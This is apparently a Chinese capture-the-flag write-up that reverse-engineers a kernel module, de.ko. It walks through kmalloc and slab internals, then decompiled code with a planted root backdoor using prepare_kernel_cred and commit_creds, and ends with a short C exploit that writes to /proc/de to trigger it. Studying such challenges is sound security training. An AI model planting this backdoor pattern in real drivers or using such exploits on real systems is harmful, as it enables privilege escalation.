内核中加载了de.ko驱动，如下图所示，且也给出了de.ko内核模块，我们针对其进行逆向。



首先来看`init_module()函数`

![image-20201118222804281](https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20201118222804281.png)

不过，一般来说，直接调用kmalloc才对，这个.....感觉就是把kmalloc里面的功能拆开实现了

```c
static __always_inline void *kmalloc(size_t size, gfp_t flags)
{
	if (__builtin_constant_p(size)) {
#ifndef CONFIG_SLOB
		unsigned int index;
#endif
		if (size > KMALLOC_MAX_CACHE_SIZE)
			return kmalloc_large(size, flags);/* 分支1：之后将会使用
                                                        __get_free_pages()来获取页
                                                            */
#ifndef CONFIG_SLOB
		index = kmalloc_index(size); //计算出相应index
		if (!index)
			return ZERO_SIZE_PTR;
		return kmem_cache_alloc_trace(
				kmalloc_caches[kmalloc_type(flags)][index],
				flags, size);
#endif
	}
	return __kmalloc(size, flags);
}
```

`kmalloc_caches`函数：

kmalloc_caches组织不同大小的缓存块，每个缓存块由一个kmem_cache结构描述，缓存块大小一般是按8字节递增，分配时不足8字节按照8字节算，依次向上舍入。其下标对应的大小为：

```c
if (!size)
		return 0;
	if (size <= KMALLOC_MIN_SIZE)
		return KMALLOC_SHIFT_LOW;
	if (KMALLOC_MIN_SIZE <= 32 && size > 64 && size <= 96)
		return 1;
	if (KMALLOC_MIN_SIZE <= 64 && size > 128 && size <= 192)
		return 2;
	if (size <=          8) return 3;
	if (size <=         16) return 4;
	if (size <=         32) return 5;
	if (size <=         64) return 6;
	if (size <=        128) return 7;
	if (size <=        256) return 8;
	if (size <=        512) return 9;
	if (size <=       1024) return 10;
	if (size <=   2 * 1024) return 11;
	if (size <=   4 * 1024) return 12;
	if (size <=   8 * 1024) return 13;
	if (size <=  16 * 1024) return 14;
	if (size <=  32 * 1024) return 15;
	if (size <=  64 * 1024) return 16;
	if (size <= 128 * 1024) return 17;
	if (size <= 256 * 1024) return 18;
	if (size <= 512 * 1024) return 19;
	if (size <= 1024 * 1024) return 20;
	if (size <=  2 * 1024 * 1024) return 21;
	if (size <=  4 * 1024 * 1024) return 22;
	if (size <=  8 * 1024 * 1024) return 23;
	if (size <=  16 * 1024 * 1024) return 24;
	if (size <=  32 * 1024 * 1024) return 25;
	if (size <=  64 * 1024 * 1024) return 26;
	BUG();
	/* Will never be reached. Needed because the compiler may complain */
	return -1;
```

`kmem_cache_alloc_trace`函数：

其核心函数为`____cache_alloc`，调用关系为`kmem_cache_alloc_trace`->`slab_alloc`->`__do_cache_alloc`->`____cache_alloc`

```c
static inline void *____cache_alloc(struct kmem_cache *cachep, gfp_t flags)
{
    void *objp;
    struct array_cache *ac;
    bool force_refill = false;

    check_irq_off();
    /*先从CPU 缓存中取*/
    ac = cpu_cache_get(cachep);
    /**/
    if (likely(ac->avail)) {
        ac->touched = 1;
        objp = ac_get_obj(cachep, ac, flags, false);

        /*
         * Allow for the possibility all avail objects are not allowed
         * by the current flags
         */
        if (objp) {
            STATS_INC_ALLOCHIT(cachep);
            goto out;
        }
        force_refill = true;
    }

    STATS_INC_ALLOCMISS(cachep);
    objp = cache_alloc_refill(cachep, flags, force_refill);
    /*
     * the 'ac' may be updated by cache_alloc_refill(),
     * and kmemleak_erase() requires its correct value.
     */
    ac = cpu_cache_get(cachep);

out:
    /*
     * To avoid a false negative, if an object that is in one of the
     * per-CPU caches is leaked, we need to make sure kmemleak doesn't
     * treat the array pointers as a reference to the object.
     */
    if (objp)
        kmemleak_erase(&ac->entry[ac->avail]);
    return objp;
}
```

从这里可以看到，该函数先根据参数中的kmem_cache获取当前CPU对应的array_cache，arrary_cache结构如下：

```c
struct array_cache {
    unsigned int avail;//可用对象的数目
    unsigned int limit;//可拥有的最大对象的数目
    unsigned int batchcount;//
    unsigned int touched;
    spinlock_t lock;
    void *entry[];    /*主要是为了访问后面的对象
             * Must have this definition in here for the proper
             * alignment of array_cache. Also simplifies accessing
             * the entries.
             *
             * Entries should not be directly dereferenced as
             * entries belonging to slabs marked pfmemalloc will
             * have the lower bits set SLAB_OBJ_PFMEMALLOC
             */
};
```

batchcount表示在缓存为空时，需要填充的对象的数量；touched表示缓存的活跃程度，entry[]指向该缓存的对象数组，对象中保存的是对象的地址，这里就表示缓存块的地址。

从这里分配对象不是从数组的起始位置分配，而是从数组末尾分配，avail就表示对象在entry数组中的下标。

回到____cache_alloc函数中，如果当前CPU缓存中有可用对象，则设置首先设置活跃位，然后调用ac_get_obj函数从缓存中获取一个对象。如果没有可用的对象，则调用cache_alloc_refill函数填充缓存，之后再次调用cpu_cache_get获取对象。获取对象之后需要调用kmemleak_erase函数设置entry数组中的对应指针为NULL。到这里发现主要有两个操作，获取对象，填充缓存。

先看获取对象ac_get_obj

```c
static inline void *ac_get_obj(struct kmem_cache *cachep,
            struct array_cache *ac, gfp_t flags, bool force_refill)
{
    void *objp;

    if (unlikely(sk_memalloc_socks()))
        objp = __ac_get_obj(cachep, ac, flags, force_refill);
    else
        objp = ac->entry[--ac->avail];

    return objp;
}
```

从unlikely可以看到这里大部分都可以直接通过entry得到对象，所以获取对象的方式还是挺简单的，直接从根据avail从entry数组中获的一个对象地址即可。并且这里avail应该指向首个为NULL的entry。

`proc_create_data`函数：

该函数会创建一个PROC entry，用户可以通过对文件系统中的该文件，和内核进行数据的交互。

主要完成2个功能：

1、调用__proc_create完成具体proc_dir_entry的创建。

2、调用proc_register把entry注册进系统。

```c
struct proc_dir_entry *proc_create_data(const char *name, umode_t mode,
                    struct proc_dir_entry *parent,
                    const struct file_operations *proc_fops,
                    void *data)
{
    struct proc_dir_entry *pde;
    if ((mode & S_IFMT) == 0)
        mode |= S_IFREG;

    if (!S_ISREG(mode)) {
        WARN_ON(1);    /* use proc_mkdir() */
        return NULL;
    }

    if ((mode & S_IALLUGO) == 0)
        mode |= S_IRUGO;
    pde = __proc_create(&parent, name, mode, 1);
    if (!pde)
        goto out;
    pde->proc_fops = proc_fops;
    pde->data = data;
    if (proc_register(parent, pde) < 0)
        goto out_free;
    return pde;
out_free:
    kfree(pde);
out:
    return NULL;
}
```

先看proc_dir_entry的创建，这里通过__proc_create函数，其实该函数内部也很简单，就是为entry分配了空间，并对相关字段进行设置，主要包含name,namelen,mod，nlink等。创建好后，就设置操作函数proc_fops和data。然后就调用proc_register进行注册

```c
static int proc_register(struct proc_dir_entry * dir, struct proc_dir_entry * dp)
{
    struct proc_dir_entry *tmp;
    int ret;
    
    ret = proc_alloc_inum(&dp->low_ino);
    if (ret)
        return ret;
     /*如果是 目录*/
    if (S_ISDIR(dp->mode)) {
        dp->proc_fops = &proc_dir_operations;
        dp->proc_iops = &proc_dir_inode_operations;
        dir->nlink++;
        /*如果是链接*/
    } else if (S_ISLNK(dp->mode)) {
        dp->proc_iops = &proc_link_inode_operations;
        /*如果是文件*/
    } else if (S_ISREG(dp->mode)) {
        BUG_ON(dp->proc_fops == NULL);
        dp->proc_iops = &proc_file_inode_operations;
    } else {
        WARN_ON(1);
        return -EINVAL;
    }

    spin_lock(&proc_subdir_lock);

    for (tmp = dir->subdir; tmp; tmp = tmp->next)
        if (strcmp(tmp->name, dp->name) == 0) {
            WARN(1, "proc_dir_entry '%s/%s' already registered\n",
                dir->name, dp->name);
            break;
        }
    /*子dir链接成链表，且子dir中含有父dir的指针*/
    dp->next = dir->subdir;
    dp->parent = dir;
    dir->subdir = dp;
    spin_unlock(&proc_subdir_lock);

    return 0;
}

```

函数首先分配一个inode number，然后根据entry的类型对其进行操作函数赋值，主要分为目录、链接、文件。这里我们只关注文件，文件的操作函数一般由用户自己定义，即上面我们设置的ops，这里仅仅是设置inode操作函数表，设置成了全局的proc_file_inode_operations，然后插入到父目录的子文件链表中，注意是头插法。其中每个子节点都有指向父节点的指针。 

主要漏洞点在`de_write`函数

```c
__int64 __usercall de_write@<rax>(__int64 a1@<rbx>, __int64 a2@<rbp>, char *a3@<rsi>, __int64 a4@<r12>, __int64 a5@<r13>, __int64 a6@<r14>, __int64 a7@<rdi>)
{
  char *v7; // rbx
  __int64 v8; // rdx
  __int64 v9; // r12
  signed __int64 v10; // rsi
  char v11; // al
  __int64 v12; // rax
  __int64 v14; // rax
  __int64 v15; // r13
  __int64 v16; // r13
  const char *v17; // [rsp-40h] [rbp-40h]
  __int64 v18; // [rsp-38h] [rbp-38h]
  unsigned __int64 v19; // [rsp-30h] [rbp-30h]
  __int64 v20; // [rsp-28h] [rbp-28h]
  __int64 v21; // [rsp-20h] [rbp-20h]
  __int64 v22; // [rsp-18h] [rbp-18h]
  __int64 v23; // [rsp-10h] [rbp-10h]
  __int64 v24; // [rsp-8h] [rbp-8h]

  _fentry__(a7, a3);
  v24 = a2;
  v23 = a6;
  v22 = a5;
  v21 = a4;
  v20 = a1;
  v7 = a3;
  v9 = v8;
  v19 = __readgsqword(0x28u);
  mutex_lock(&lock);
  v10 = (unsigned __int8)*a3;
  printk("order:%d");
  v11 = *v7;
  if ( *v7 )
  {
    if ( v11 == -1 )
    {
      printk("note write\n");
      v16 = *((_QWORD *)&note + 1);
      _check_object_size(*((_QWORD *)&note + 1), v9 - 1, 0LL);
      v10 = (signed __int64)(v7 + 1);
      copy_from_user(v16, v7 + 1, v9 - 1);
      printk("write contents compelete\n");
    }
    else if ( v11 == -2 )
    {
      printk("note write magic %ld\n");
      v15 = hack;
      _check_object_size(hack, v9 - 1, 0LL);
      v10 = (signed __int64)(v7 + 1);
      copy_from_user(v15, v7 + 1, v9 - 1);
    }
    else if ( v11 != -3 || *(_BYTE *)(hack + 8) )
    {
      printk("note malloc\n");
      note = *v7;
      printk("write size compelete\n");
      v12 = _kmalloc((unsigned __int8)note, 0x14000C0LL);
      v10 = (unsigned __int8)note;
      *((_QWORD *)&note + 1) = v12;
      printk("malloc size compelete:%d @ %p\n");
    }
    else
    {
      v14 = prepare_kernel_cred(0LL, v10);
      commit_creds(v14);
      v17 = "/usr/bin/gnome-calculator";
      v18 = 0LL;
      v10 = (unsigned int)call_usermodehelper("/usr/bin/gnome-calculator", &v17, envp_26376, 1LL);
      printk("RC is: %i \n");
    }
  }
  else
  {
    printk("note free\n");
    kfree(*((_QWORD *)&note + 1), v10);
  }
  mutex_unlock(&lock, v10);
  return v9;
}
```

根据我们输入的内容的第一个字节当作case来判断：

case为-1（0xFF）时，将用户输入拷贝到（&note+1）

case为-2（0xFE）时，将用户输入拷贝到hack(此时可以覆盖hack+8地址处的值)

case为-3（0xFD）且(hack+8)==0)时，执行后门代码，弹计算器

case不为-3（0xFD）或者(hack+8)==1)时，会给(&note+1)处分配一块指定大小的内存

所以我们的思路比较明确了，先输入-2，将hack+8地址处的数据清零，然后再输入-3弹计算器。

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
    int fd = open("/proc/de",2);
    char *user_buf = (char*)malloc(0x10*sizeof(char));
    user_buf[0] = '\xfe';
    write(fd,user_buf,0x10);
    user_buf[0] = '\xfd';
    write(fd,user_buf,0x1);
    return 0;
}
```

